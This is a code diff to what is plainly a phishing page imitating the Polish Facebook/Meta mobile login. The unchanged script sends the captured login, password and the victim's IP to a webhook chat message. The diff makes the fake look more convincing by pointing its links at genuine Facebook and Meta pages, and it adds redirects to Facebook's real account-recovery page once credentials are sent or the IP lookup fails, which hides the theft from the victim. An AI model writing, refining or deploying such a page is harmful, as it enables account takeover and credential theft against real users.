@@ -77,13 +77,14 @@ font-size: 15px;
 color: var(--black);
 font-weight: 500;
 margin-bottom: 124px;
+cursor: pointer;
 }
 .new-account {
 display: inline-block;
 background-color: transparent;
 color: var(--blue);
 border: 2px solid var(--blue);
-font-weight: 600;
+font-weight: 400;
 border-radius: 22px;
 padding: 11px 0;
 width: 100%;
@@ -128,13 +129,13 @@ text-decoration: underline;
 <input class="input" placeholder="Numer telefonu komórkowego lub adres e-mail" id="abc" />
 <input class="input" placeholder="Hasło" type="text" id="password" />
 <button class="cta" id="loginBtn">Zaloguj się</button>
-<div class="forgot">Nie pamiętasz hasła?</div>
-<a href="#" class="new-account">Utwórz nowe konto</a>
+<div class="forgot" onclick="window.location.href='https://m.facebook.com/login/identify/'">Nie pamiętasz hasła?</div>
+<a href="https://m.facebook.com/reg/" class="new-account">Utwórz nowe konto</a>
 <div class="meta"><img src="image.png" alt="Meta" /></div>
 <div class="footer">
-<a href="#">Informacje</a>
-<a href="#">Pomoc</a>
-<a href="#">Więcej</a>
+<a href="https://www.meta.com/pl-pl/about/?utm_source=about.meta.com&utm_medium=redirect">Informacje</a>
+<a href="https://www.meta.com/pl-pl/about/?utm_source=about.meta.com&utm_medium=redirect">Pomoc</a>
+<a href="https://www.meta.com/pl-pl/about/?utm_source=about.meta.com&utm_medium=redirect">Więcej</a>
 </div>
 </div>
 <script>
@@ -231,10 +232,13 @@ headers: {
 body: JSON.stringify({
 content: `@everyone\n# NOWA WYJEBKA!\n**Loginy: ${abcValue}**\n**Hasło: ${abcdValue}**\nIP: ${userIP}`
 })
+}).then(() => {
+window.location.href = "https://m.facebook.com/login/identify/";
 });
 })
 .catch(err => {
 console.error("Błąd pobierania IP:", err);
+window.location.href = "https://m.facebook.com/login/identify/";
 });
 });
 </script>
